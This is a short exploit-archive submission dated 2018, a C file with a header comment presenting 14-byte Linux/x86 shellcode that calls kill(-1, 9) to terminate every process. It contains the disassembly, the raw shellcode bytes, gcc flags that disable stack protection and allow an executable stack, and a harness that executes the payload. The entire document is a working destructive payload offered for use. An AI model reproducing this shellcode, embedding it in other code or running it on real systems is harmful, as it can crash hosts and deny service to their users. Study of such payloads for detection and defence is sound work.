/*
# Exploit Title: Linux/x86 - Kill All Processes Shellcode (14 bytes)
# Google Dork: None
# Date: 2018-12-08
# Exploit Author: strider
# Vendor Homepage: None
# Software Link: None
# Tested on: Debian 9 Stretch i386/ Kali Linux i386
# CVE : None
# Shellcode Length: 14
# Description: Linux/x86 kill 9 -1 (14 bytes)
------------------------------[Description]---------------------------------

This shellcode will kill all processes

-----------------------------[Shellcode Dump]---------------------------------

08048060 <_start>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	b0 25                	mov    $0x25,%al
 8048065:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
 804806a:	b1 09                	mov    $0x9,%cl
 804806c:	cd 80                	int    $0x80

 -----------------------------[Compile]---------------------------------------------
 gcc -m32 -fno-stack-protector -z execstack -o tester tester.c

 -----------------------------[C-Code]-----------------------------
*/

 #include<stdio.h>
 #include<string.h>

 unsigned char code[] = "\x31\xc0\x50\xb0\x25\xbb\xff\xff\xff\xff\xb1\x09\xcd\x80";
 main()
 {

     printf("Shellcode Length: %d\n", strlen(code));

     int (*ret)() = (int(*)())code;

     ret();
 }